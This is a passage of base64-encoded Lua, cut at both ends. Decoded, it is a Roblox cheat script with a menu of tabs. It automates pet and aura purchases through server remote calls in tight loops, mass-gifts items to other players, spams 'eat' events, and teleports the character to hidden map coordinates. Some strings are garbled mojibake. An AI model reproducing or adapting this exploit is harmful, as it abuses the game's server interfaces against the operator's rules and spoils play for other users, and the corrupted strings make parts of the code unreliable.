CAgICAgIGxvY2FsIGxlYWRlcnN0YXRzID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJsZWFkZXJzdGF0cyIpCiAgICAgICAgICAgICAgICBpZiBsZWFkZXJzdGF0cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBVcGRhdGUuVGV4dCA9ICJTdHJlbmd0aDogIiAuLiBGb3JtYXREaXNwbGF5KGxlYWRlcnN0YXRzLlN0cmVuZ3RoLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJSZWJpcnRocyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVXBkYXRlMi5UZXh0ID0gIlJlYmlydGg6ICIgLi4gRm9ybWF0RGlzcGxheShsZWFkZXJzdGF0cy5SZWJpcnRocy5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZCgiS2lsbHMiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFVwZGF0ZTUuVGV4dCA9ICJLaWxsczogIiAuLiBGb3JtYXREaXNwbGF5KGxlYWRlcnN0YXRzLktpbGxzLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJjdXJyZW50TWFwIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTkuVGV4dCA9ICJDdXJyZW50IE1hcDogIiAuLiB0b3N0cmluZyhwbGF5ZXIuY3VycmVudE1hcC5WYWx1ZSkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBVcGRhdGU5LlRleHQgPSAiQ3VycmVudCBNYXA6IEF1Y3VuZSBkb25uw4PGksOG4oCZw4PigKDDouKCrOKEosODxpLDouKCrCDDg8Kiw6LigJrCrMOi4oCewqLDg8aSw4bigJnDg8Kiw6LigJrCrMOFwqHDg8aSw6LigqzFocOD4oCaw4LCqWUiCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwgcGV0cyA9IHdpbmRvdzpBZGRUYWIoIlBldCBTaG9wIikKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKCmxvY2FsIHNlbGVjdGVkUGV0ID0gIk5lb24gR3VhcmRpYW4iCmxvY2FsIHBldERyb3Bkb3duID0gcGV0czpBZGREcm9wZG93bigiU2VsZWN0IFBldCIsIGZ1bmN0aW9uKHRleHQpCiAgICBzZWxlY3RlZFBldCA9IHRleHQKZW5kKQoKcGV0RHJvcGRvd246QWRkKCJOZW9uIEd1YXJkaWFuIikKcGV0RHJvcGRvd246QWRkKCJCbHVlIEJpcmRpZSIpCnBldERyb3Bkb3duOkFkZCgiQmx1ZSBCdW5ueSIpCnBldERyb3Bkb3duOkFkZCgiQmx1ZSBGaXJlY2FzdGVyIikKcGV0RHJvcGRvd246QWRkKCJCbHVlIFBoZW9uaXgiKQpwZXREcm9wZG93bjpBZGQoIkNyaW1zb24gRmFsY29uIikKcGV0RHJvcGRvd246QWRkKCJDeWJlcm5ldGljIFNob3dkb3duIERyYWdvbiIpCnBldERyb3Bkb3duOkFkZCgiRGFyayBHb2xlbSIpCnBldERyb3Bkb3duOkFkZCgiRGFyayBMZWdlbmRzIE1hbnRpY29yZSIpCnBldERyb3Bkb3duOkFkZCgiRGFyayBWYW1weSIpCnBldERyb3Bkb3duOkFkZCgiRGFya3N0YXIgSHVudGVyIikKcGV0RHJvcGRvd246QWRkKCJFdGVybmFsIFN0cmlrZSBMZXZpYXRoYW4iKQpwZXREcm9wZG93bjpBZGQoIkZyb3N0d2F2ZSBMZWdlbmRzIFBlbmd1aW4iKQpwZXREcm9wZG93bjpBZGQoIkdvbGQgV2FycmlvciIpCnBldERyb3Bkb3duOkFkZCgiR29sZGVuIFBoZW9uaXgiKQpwZXREcm9wZG93bjpBZGQoIkdvbGRlbiBWaWtpbmciKQpwZXREcm9wZG93bjpBZGQoIkdyZWVuIEJ1dHRlcmZseSIpCnBldERyb3Bkb3duOkFkZCgiR3JlZW4gRmlyZWNhc3RlciIpCnBldERyb3Bkb3duOkFkZCgiSW5mZXJuYWwgRHJhZ29uIikKcGV0RHJvcGRvd246QWRkKCJMaWdodG5pbmcgU3RyaWtlIFBoYW50b20iKQpwZXREcm9wZG93bjpBZGQoIk1hZ2ljIEJ1dHRlcmZseSIpCnBldERyb3Bkb3duOkFkZCgiTXVzY2xlIFNlbnNlaSIpCnBldERyb3Bkb3duOkFkZCgiT3JhbmdlIEhlZGdlaG9nIikKcGV0RHJvcGRvd246QWRkKCJPcmFuZ2UgUGVnYXN1cyIpCnBldERyb3Bkb3duOkFkZCgiUGhhbnRvbSBHZW5lc2lzIERyYWdvbiIpCnBldERyb3Bkb3duOkFkZCgiUHVycGxlIERyYWdvbiIpCnBldERyb3Bkb3duOkFkZCgiUHVycGxlIEZhbGNvbiIpCnBldERyb3Bkb3duOkFkZCgiUmVkIERyYWdvbiIpCnBldERyb3Bkb3duOkFkZCgiUmVkIEZpcmVjYXN0ZXIiKQpwZXREcm9wZG93bjpBZGQoIlJlZCBLaXR0eSIpCnBldERyb3Bkb3duOkFkZCgiU2lsdmVyIERvZyIpCnBldERyb3Bkb3duOkFkZCgiVWx0aW1hdGUgU3VwZXJub3ZhIFBlZ2FzdXMiKQpwZXREcm9wZG93bjpBZGQoIlVsdHJhIEJpcmRpZSIpCnBldERyb3Bkb3duOkFkZCgiV2hpdGUgUGVnYXN1cyIpCnBldERyb3Bkb3duOkFkZCgiV2hpdGUgUGhlb25peCIpCnBldERyb3Bkb3duOkFkZCgiWWVsbG93IEJ1dHRlcmZseSIpCgpwZXRzOkFkZFN3aXRjaCgiQXV0byBPcGVuIFBldCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5BdXRvSGF0Y2hQZXQgPSBib29sCiAgICBpZiBib29sIHRoZW4KICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkF1dG9IYXRjaFBldCBhbmQgc2VsZWN0ZWRQZXQgfj0gIiIgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHBldFRvT3BlbiA9IFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wRm9sZGVyOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGV0KQogICAgICAgICAgICAgICAgaWYgcGV0VG9PcGVuIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcFJlbW90ZTpJbnZva2VTZXJ2ZXIocGV0VG9PcGVuKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKbG9jYWwgc2VsZWN0ZWRBdXJhID0gIkJsdWUgQXVyYSIKbG9jYWwgYXVyYURyb3Bkb3duID0gcGV0czpBZGREcm9wZG93bigiU2VsZWN0IEF1cmEiLCBmdW5jdGlvbih0ZXh0KQogICAgc2VsZWN0ZWRBdXJhID0gdGV4dAplbmQpCgphdXJhRHJvcGRvd246QWRkKCJBc3RyYWwgRWxlY3RybyIpCmF1cmFEcm9wZG93bjpBZGQoIkF6dXJlIFR1bmRyYSIpCmF1cmFEcm9wZG93bjpBZGQoIkJsdWUgQXVyYSIpCmF1cmFEcm9wZG93bjpBZGQoIkRhcmsgRWxlY3RybyIpCmF1cmFEcm9wZG93bjpBZGQoIkRhcmsgTGlnaHRuaW5nIikKYXVyYURyb3Bkb3duOkFkZCgiRGFyayBTdG9ybSIpCmF1cmFEcm9wZG93bjpBZGQoIkVsZWN0cm8iKQphdXJhRHJvcGRvd246QWRkKCJFbmNoYW50ZWQgTWlyYWdlIikKYXVyYURyb3Bkb3duOkFkZCgiRW50cm9waWMgQmxhc3QiKQphdXJhRHJvcGRvd246QWRkKCJFdGVybmFsIE1lZ2FzdHJpa2UiKQphdXJhRHJvcGRvd246QWRkKCJHcmFuZCBTdXBlcm5vdmEiKQphdXJhRHJvcGRvd246QWRkKCJHcmVlbiBBdXJhIikKYXVyYURyb3Bkb3duOkFkZCgiSW5mZXJubyIpCmF1cmFEcm9wZG93bjpBZGQoIkxpZ2h0bmluZyIpCmF1cmFEcm9wZG93bjpBZGQoIk11c2NsZSBLaW5nIikKYXVyYURyb3Bkb3duOkFkZCgiUG93ZXIgTGlnaHRuaW5nIikKYXVyYURyb3Bkb3duOkFkZCgiUHVycGxlIEF1cmEiKQphdXJhRHJvcGRvd246QWRkKCJQdXJwbGUgTm92YSIpCmF1cmFEcm9wZG93bjpBZGQoIlJlZCBBdXJhIikKYXVyYURyb3Bkb3duOkFkZCgiU3VwZXJub3ZhIikKYXVyYURyb3Bkb3duOkFkZCgiVWx0cmEgSW5mZXJubyIpCmF1cmFEcm9wZG93bjpBZGQoIlVsdHJhIE1pcmFnZSIpCmF1cmFEcm9wZG93bjpBZGQoIlVuc3RhYmxlIE1pcmFnZSIpCmF1cmFEcm9wZG93bjpBZGQoIlllbGxvdyBBdXJhIikKCnBldHM6QWRkU3dpdGNoKCJBdXRvIE9wZW4gQXVyYSIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5BdXRvSGF0Y2hBdXJhID0gYm9vbAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5BdXRvSGF0Y2hBdXJhIGFuZCBzZWxlY3RlZEF1cmEgfj0gIiIgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGF1cmFUb09wZW4gPSBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcEZvbGRlcjpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZEF1cmEpCiAgICAgICAgICAgICAgICBpZiBhdXJhVG9PcGVuIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcFJlbW90ZTpJbnZva2VTZXJ2ZXIoYXVyYVRvT3BlbikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKCmxvY2FsIEdpZnQgPSB3aW5kb3c6QWRkVGFiKCJHaWZ0IikKR2lmdDpBZGRMYWJlbCgiR2lmdGluZyBQcm90ZWluIGVnZzoiKS5UZXh0U2l6ZSA9IDIyCgpsb2NhbCBwcm90ZWluRWdnTGFiZWwgPSBHaWZ0OkFkZExhYmVsKCJQcm90ZWluIEVnZ3M6IDAiKQpwcm90ZWluRWdnTGFiZWwuVGV4dFNpemUgPSAyMAoKbG9jYWwgc2VsZWN0ZWRFZ2dQbGF5ZXIgPSBuaWwKbG9jYWwgZWdnQ291bnQgPSAwCgpsb2NhbCBlZ2dEcm9wZG93biA9IEdpZnQ6QWRkRHJvcGRvd24oIlBsYXllciB0byBHaWZ0IEVnZ3MiLCBmdW5jdGlvbihzZWxlY3RlZERpc3BsYXlOYW1lKQogICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxyLkRpc3BsYXlOYW1lID09IHNlbGVjdGVkRGlzcGxheU5hbWUgdGhlbgogICAgICAgICAgICBzZWxlY3RlZEVnZ1BsYXllciA9IHBscgogICAgICAgICAgICBicmVhawogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxyIH49IFBsYXllcnMuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGVnZ0Ryb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kCgpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxyKQogICAgaWYgcGxyIH49IFBsYXllcnMuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGVnZ0Ryb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kKQoKR2lmdDpBZGRUZXh0Qm94KCJBbW91bnQgb2YgRWdncyIsIGZ1bmN0aW9uKHRleHQpCiAgICBlZ2dDb3VudCA9IHRvbnVtYmVyKHRleHQpIG9yIDAKZW5kKQoKR2lmdDpBZGRCdXR0b24oIkdpZnQgRWdncyIsIGZ1bmN0aW9uKCkKICAgIGlmIHNlbGVjdGVkRWdnUGxheWVyIGFuZCBlZ2dDb3VudCA+IDAgdGhlbgogICAgICAgIGZvciBpID0gMSwgZWdnQ291bnQgZG8KICAgICAgICAgICAgbG9jYWwgZWdnID0gUGxheWVycy5Mb2NhbFBsYXllci5jb25zdW1hYmxlc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZCgiUHJvdGVpbiBFZ2ciKQogICAgICAgICAgICBpZiBlZ2cgdGhlbgogICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuckV2ZW50cy5naWZ0UmVtb3RlOkludm9rZVNlcnZlcigiZ2lmdFJlcXVlc3QiLCBzZWxlY3RlZEVnZ1BsYXllciwgZWdnKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKR2lmdDpBZGRMYWJlbCgiR2lmdGluZyBUcm9waWNhbCBTaGFrZXM6IikuVGV4dFNpemUgPSAyMgoKbG9jYWwgdHJvcGljYWxTaGFrZUxhYmVsID0gR2lmdDpBZGRMYWJlbCgiVHJvcGljYWwgU2hha2VzOiAwIikKdHJvcGljYWxTaGFrZUxhYmVsLlRleHRTaXplID0gMTgKCmxvY2FsIHNlbGVjdGVkU2hha2VQbGF5ZXIgPSBuaWwKbG9jYWwgc2hha2VDb3VudCA9IDAKCmxvY2FsIHNoYWtlRHJvcGRvd24gPSBHaWZ0OkFkZERyb3Bkb3duKCJQbGF5ZXIgdG8gR2lmdCBUcm9waWNhbCBTaGFrZXMiLCBmdW5jdGlvbihzZWxlY3RlZERpc3BsYXlOYW1lKQogICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxyLkRpc3BsYXlOYW1lID09IHNlbGVjdGVkRGlzcGxheU5hbWUgdGhlbgogICAgICAgICAgICBzZWxlY3RlZFNoYWtlUGxheWVyID0gcGxyCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbHIgfj0gUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgc2hha2VEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgIGlmIHBsciB+PSBQbGF5ZXJzLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBzaGFrZURyb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kKQoKR2lmdDpBZGRUZXh0Qm94KCJUcm9waWNhbCBTaGFrZXMgZ2lmdCIsIGZ1bmN0aW9uKHRleHQpCiAgICBzaGFrZUNvdW50ID0gdG9udW1iZXIodGV4dCkgb3IgMAplbmQpCgpHaWZ0OkFkZEJ1dHRvbigiR2lmdCBUcm9waWNhbCBTaGFrZXMiLCBmdW5jdGlvbigpCiAgICBpZiBzZWxlY3RlZFNoYWtlUGxheWVyIGFuZCBzaGFrZUNvdW50ID4gMCB0aGVuCiAgICAgICAgZm9yIGkgPSAxLCBzaGFrZUNvdW50IGRvCiAgICAgICAgICAgIGxvY2FsIHNoYWtlID0gUGxheWVycy5Mb2NhbFBsYXllci5jb25zdW1hYmxlc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZCgiVHJvcGljYWwgU2hha2UiKQogICAgICAgICAgICBpZiBzaGFrZSB0aGVuCiAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLmdpZnRSZW1vdGU6SW52b2tlU2VydmVyKCJnaWZ0UmVxdWVzdCIsIHNlbGVjdGVkU2hha2VQbGF5ZXIsIHNoYWtlKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwgZnVuY3Rpb24gdXBkYXRlSXRlbUNvdW50KCkKICAgIGxvY2FsIHByb3RlaW5FZ2dDb3VudCA9IDAKICAgIGxvY2FsIHRyb3BpY2FsU2hha2VDb3VudCA9IDAKCiAgICBsb2NhbCBiYWNrcGFjayA9IFBsYXllcnMuTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCiAgICBpZiBiYWNrcGFjayB0aGVuCiAgICAgICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKGJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGl0ZW0uTmFtZSA9PSAiUHJvdGVpbiBFZ2ciIHRoZW4KICAgICAgICAgICAgICAgIHByb3RlaW5FZ2dDb3VudCA9IHByb3RlaW5FZ2dDb3VudCArIDEKICAgICAgICAgICAgZWxzZWlmIGl0ZW0uTmFtZSA9PSAiVHJvcGljYWwgU2hha2UiIG9yIGl0ZW0uTmFtZSA9PSAiUGnDg8aSw4bigJnDg+KAoMOi4oKs4oSiw4PGksOi4oKsxaHDg+KAmsOCwrFhcyIgdGhlbgogICAgICAgICAgICAgICAgdHJvcGljYWxTaGFrZUNvdW50ID0gdHJvcGljYWxTaGFrZUNvdW50ICsgMQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHByb3RlaW5FZ2dMYWJlbC5UZXh0ID0gIlByb3RlaW4gRWdnczogIiAuLiBwcm90ZWluRWdnQ291bnQKICAgIHRyb3BpY2FsU2hha2VMYWJlbC5UZXh0ID0gIlRyb3BpY2FsIFNoYWtlczogIiAuLiB0cm9waWNhbFNoYWtlQ291bnQKZW5kCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICB1cGRhdGVJdGVtQ291bnQoKQogICAgICAgIHRhc2sud2FpdCgwLjI1KQogICAgZW5kCmVuZCkKCgpsb2NhbCBpdGVtTGlzdCA9IHsKICAgICJUcm9waWNhbCBTaGFrZSIsCiAgICAiRW5lcmd5IFNoYWtlIiwKICAgICJQcm90ZWluIEJhciIsCiAgICAiVE9VR0ggQmFyIiwKICAgICJQcm90ZWluIFNoYWtlIiwKICAgICJVTFRSQSBTaGFrZSIsCiAgICAiRW5lcmd5IEJhciIKfQoKbG9jYWwgZnVuY3Rpb24gZm9ybWF0RXZlbnROYW1lKGl0ZW1OYW1lKQogICAgbG9jYWwgcGFydHMgPSB7fQogICAgZm9yIHdvcmQgaW4gaXRlbU5hbWU6Z21hdGNoKCIlUysiKSBkbwogICAgICAgIHRhYmxlLmluc2VydChwYXJ0cywgd29yZDpsb3dlcigpKQogICAgZW5kCiAgICBmb3IgaSA9IDIsICNwYXJ0cyBkbwogICAgICAgIHBhcnRzW2ldID0gcGFydHNbaV06c3ViKDEsIDEpOnVwcGVyKCkgLi4gcGFydHNbaV06c3ViKDIpCiAgICBlbmQKICAgIHJldHVybiB0YWJsZS5jb25jYXQocGFydHMpCmVuZAoKbG9jYWwgZnVuY3Rpb24gYWN0aXZhdGVSYW5kb21JdGVtcyhjb3VudCkKICAgIGxvY2FsIHNodWZmbGVkSXRlbXMgPSB7fQogICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKGl0ZW1MaXN0KSBkbwogICAgICAgIHRhYmxlLmluc2VydChzaHVmZmxlZEl0ZW1zLCBpdGVtKQogICAgZW5kCiAgICBmb3IgaSA9ICNzaHVmZmxlZEl0ZW1zLCAyLCAtMSBkbwogICAgICAgIGxvY2FsIGogPSBtYXRoLnJhbmRvbShpKQogICAgICAgIHNodWZmbGVkSXRlbXNbaV0sIHNodWZmbGVkSXRlbXNbal0gPSBzaHVmZmxlZEl0ZW1zW2pdLCBzaHVmZmxlZEl0ZW1zW2ldCiAgICBlbmQKICAgIGZvciBpID0gMSwgbWF0aC5taW4oY291bnQsICNzaHVmZmxlZEl0ZW1zKSBkbwogICAgICAgIGxvY2FsIHRvb2wgPQogICAgICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHNodWZmbGVkSXRlbXNbaV0pIG9yIHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChzaHVmZmxlZEl0ZW1zW2ldKQogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICBsb2NhbCBldmVudE5hbWUgPSBmb3JtYXRFdmVudE5hbWUoc2h1ZmZsZWRJdGVtc1tpXSkKICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoZXZlbnROYW1lLCB0b29sKQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZWF0aW5nUnVubmluZyA9IGZhbHNlCnRhc2suc3Bhd24oCiAgICBmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICBpZiBlYXRpbmdSdW5uaW5nIHRoZW4KICAgICAgICAgICAgICAgIGFjdGl2YXRlUmFuZG9tSXRlbXMoNCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCikKCkdpZnQ6QWRkTGFiZWwoIiIpCgpHaWZ0OkFkZEJ1dHRvbigKICAgICJFYXQgRXZlcnl0aGluZyIsCiAgICBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBlYXRpbmdSdW5uaW5nID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGFjdGl2YXRlUmFuZG9tSXRlbXMoNCkKICAgICAgICBlbmQKICAgIGVuZAopCgpsb2NhbCB0ZWxlcG9ydCA9IHdpbmRvdzpBZGRUYWIoIlRlbGVwb3J0IikKCnRlbGVwb3J0OkFkZEJ1dHRvbigiU3Bhd24iLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDIsIDgsIDExNSkKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgVGV4dCA9ICJUZWxlcG9ydGVkIHRvIFNwYXduIiwKICAgICAgICBEdXJhdGlvbiA9IDAKICAgIH0pCmVuZCkKCnRlbGVwb3J0OkFkZEJ1dHRvbigiU2VjcmV0IEFyZWEiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDE5NDcsIDIsIDYxOTEpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgIFRleHQgPSAiVGVsZXBvcnRlZCB0byBTZWNyZXQgQXJlYSIsCiAgICAgICAgRHVyYXRpb24gPSAwCiAgICB9KQplbmQpCgp0ZWxlcG9ydDpBZGRCdXR0b24oIlRpbnkgSXNsYW5kIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMzQsIDcsIDE5MDMpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgIFRleHQgPSAiVGVsZXBvcnRlZCB0byBUaW55IElzbGFuZCIsCiAgICAgICAgRHVyYXRpb24gPSAwCiAgICB9KQplbmQpCgp0ZWxlcG9ydDpBZGRCdXR0b24oIkZyb3plbiBJc2xhbmQiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC0gMjYwMC4wMDI0NCwgMy42NzY4NjU1OCwgLSA0MDMuODg0MzY5LCAwLjA4NzM2MTcwMDgsIDEuMDQ4Mjg5OWUtMDksIDAuOTk2MTc2NjYsIDMuMDcyMDQyNTNlLTA4LCAxLCAtIDMuNzQ2NDAyM2UtMDksIC0gMC45OTYxNzY2NiwgMy4wOTMwMjYyOGUtMDgsIDAuMDg3MzYxNzAwOCkKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgVGV4dCA9ICJUZWxlcG9ydGVkIHRvIEZyb3plbiBJc2xhbmQiLAogICAgICAgIER1cmF0aW9uID0gMAogICAgfSkKZW5kKQoKdGVsZXBvcnQ6QWRkQnV0dG9uKCJNeXRoaWNhbCBJc2xhbmQiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDIyNTUsIDcsIDEwNzEpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgIFRleHQgPSAiVGVsZXBvcnRlZCB0byBNeXRoaWNhbCBJc2xhbmQiLAogICAgICAgIER1cmF0aW9uID0gMAogICAgfSkKZW5kKQoKdGVsZXBvcnQ6QWRkQnV0dG9uKCJIZWxsIElzbGFuZCIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhcmFjdGVyID0gcG